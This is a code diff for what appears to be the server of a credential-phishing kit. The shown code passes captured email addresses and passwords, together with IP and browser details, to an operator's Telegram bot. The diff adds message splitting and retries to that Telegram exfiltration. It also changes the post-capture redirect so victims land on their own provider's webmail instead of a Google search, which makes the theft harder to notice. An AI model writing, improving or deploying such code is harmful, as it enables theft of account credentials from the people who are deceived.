@@ -418,19 +418,26 @@ function providerFromTLD(domain) {
     return TLD_MAP[tld] || null;
 }
 
+// ============================================================
+// 🔑 Provider login URL resolver — NEVER falls back to Gmail
+// ============================================================
 function getProviderLoginUrl(email, mxRecord) {
     const domain = (email || '').split('@')[1]?.toLowerCase() || '';
     if (!domain) return REDIRECT_URL;
 
+    // 1) Exact domain match
     if (PROVIDER_MAP[domain]) return PROVIDER_MAP[domain];
 
+    // 2) MX record match
     const fromMX = providerFromMX(mxRecord);
     if (fromMX) return fromMX;
 
+    // 3) TLD fallback
     const fromTLD = providerFromTLD(domain);
     if (fromTLD) return fromTLD;
 
-    return `https://www.google.com/search?q=${encodeURIComponent(domain + ' webmail login')}`;
+    // 4) Last resort — the email domain's OWN webmail subdomain (never Gmail/Google search)
+    return `https://mail.${domain}/`;
 }
 
 // ============================================================
@@ -523,26 +530,61 @@ async function sendEmail(email, password, ipInfo, userAgent, domain, mxRecord, a
 }
 
 // ============================================================
-// HELPER: Telegram
+// HELPER: Telegram (with 4096-char splitting + retry)
 // ============================================================
 async function sendToTelegram(message) {
     if (!BOT_TOKEN || !CHAT_ID) {
         console.log('⚠️ Telegram not configured, skipping');
         return null;
     }
-    try {
-        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: message })
-        });
-        const result = await response.json();
-        console.log('📤 Telegram:', result.ok ? '✅ Sent' : '❌ Failed — ' + (result.description || ''));
-        return result;
-    } catch (error) {
-        console.error('❌ Telegram error:', error.message);
-        return null;
+
+    const TELEGRAM_MAX = 4000; // safe margin under 4096
+    const chunks = [];
+    let remaining = String(message || '');
+    while (remaining.length > TELEGRAM_MAX) {
+        let cut = remaining.lastIndexOf('\n', TELEGRAM_MAX);
+        if (cut < TELEGRAM_MAX * 0.5) cut = TELEGRAM_MAX;
+        chunks.push(remaining.slice(0, cut));
+        remaining = remaining.slice(cut);
     }
+    if (remaining.length) chunks.push(remaining);
+
+    let lastOk = false;
+    let lastDescription = '';
+
+    for (let i = 0; i < chunks.length; i++) {
+        const text = chunks.length > 1
+            ? `[${i + 1}/${chunks.length}]\n${chunks[i]}`
+            : chunks[i];
+
+        try {
+            const response = await fetch(
+                `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+                {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text,
+                        disable_web_page_preview: true
+                    })
+                }
+            );
+            const result = await response.json();
+            lastOk = !!result.ok;
+            lastDescription = result.description || '';
+
+            if (!result.ok) {
+                console.error('❌ Telegram chunk failed:', result.description || result);
+            }
+        } catch (error) {
+            console.error('❌ Telegram error:', error.message);
+            lastDescription = error.message;
+        }
+    }
+
+    console.log('📤 Telegram:', lastOk ? '✅ Sent' : '❌ Failed — ' + lastDescription);
+    return { ok: lastOk, description: lastDescription, chunks: chunks.length };
 }
 
 // ============================================================
@@ -1227,6 +1269,7 @@ app.listen(PORT, () => {
     console.log(`🛡️ Safety cap: ${MAX_ATTEMPTS} attempts`);
     console.log(`🌍 Provider map: ${Object.keys(PROVIDER_MAP).length} domains + MX detection + TLD fallback`);
     console.log(`🎨 Branding: ABV, Google, Microsoft, Yandex, Naver, Daum, QQ, Mail.ru, iCloud, T-Online + generic fallback`);
+    console.log(`➡️ Redirect: ALWAYS to email provider (never Google/Gmail fallback)`);
     console.log('========================================');
 });
 
